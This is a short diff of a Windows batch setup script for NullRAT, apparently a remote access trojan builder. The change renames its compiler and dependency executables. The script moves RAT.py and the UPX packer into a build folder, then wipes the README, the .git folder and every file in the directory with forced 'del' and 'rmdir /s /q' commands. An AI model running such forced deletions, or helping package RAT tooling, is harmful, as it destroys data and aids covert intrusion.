@@ -8,8 +8,8 @@ cd "%~dp0\" & rmdir /s /q "%~dp0\src\"
 mkdir "%~dp0\src\" & move RAT.py "%~dp0\src\"
 move custom_icon.ico "%~dp0\src\" & mkdir "%~dp0\src\upx\"
 move upx.exe "%~dp0\src\upx\" 
-move "3) NullRAT Compiler".exe "%~dp0\temp"
-move "2) NullRAT DepInst".exe "%~dp0\temp"
+move "2) NullRAT Compiler".exe "%~dp0\temp"
+move "1) NullRAT Dependencies".exe "%~dp0\temp"
 if exist README.md (del README.md)
 if exist .git\ (rmdir /s /q .git\)
 del /f /q *.* 
